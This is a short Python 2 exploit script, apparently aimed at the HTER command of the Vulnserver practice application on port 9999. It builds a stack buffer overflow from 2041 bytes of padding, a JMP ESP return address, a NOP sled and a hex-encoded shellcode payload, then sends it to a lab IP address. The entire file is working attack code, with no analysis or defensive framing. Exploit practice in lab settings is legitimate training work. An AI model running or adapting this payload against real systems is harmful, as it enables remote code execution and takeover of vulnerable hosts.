#!/usr/bin/python

import sys, socket

ip = "192.168.82.128"
port = 9999

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	print "[*] Connection Successful"
except:
	print "[!] Connection failed. Exiting..."
	sys.exit(1)


shellcode = (
"b8640a0ecddbd0d97424f45a31c9b152"
"83c20431420e032604ec385af072c2a2"
"01134a473013280c63a33a4088486e70"
"1b3ca777ac8b91b62da7e2d9adba3639"
"8f744b38c869a66881e6159ca6b3a517"
"f452aec44d549f5bc50f3f5a0a247644"
"4f01c0ffbbfdd329f2fe78143a0d8051"
"fdeef7abfd930f687f48856a271b3d56"
"d9c8d81dd5a5af79fa3863f206b082d4"
"8e82a0f0cb51c8a1b134f5b119e853ba"
"b4fde9e1d032c019215d536a13c2cfe4"
"1f8bc9f360a6ae6b9f49cfa2641d9fdc"
"4d1e741c71cbdb4cdda49b3c9d147456"
"124a6459f8e30fa06bcc78f8eaa47afc"
"ed8ff21a87ff52b53099fe4da066d528"
"e2eddacdad0596dd5ae6edbfcdf9dbd7"
"92688027dc901f708967561427d1c00a"
"ba872b8e6174b50fe7c0911f31c89d4b"
"ed9f4b254b763a9f05259477d3052701"
"dc43d1ed6d3aa41241aa206bbf4acea6"
"7b7a85ea2a13407f6f7e73aaac87f05e"
"4d7ce82b4838aec020515be697524e")


# Offset is 2041
# 625011AF JMP ESP

evil = "A" * (2041) + "AF115062" + "90" * 8 + shellcode + "C" * (4500 - 2041 - 4 - 8 - len(shellcode))

buffer = "HTER " + evil + "\r\n"


s.recv(1024)
s.send(buffer)
s.close()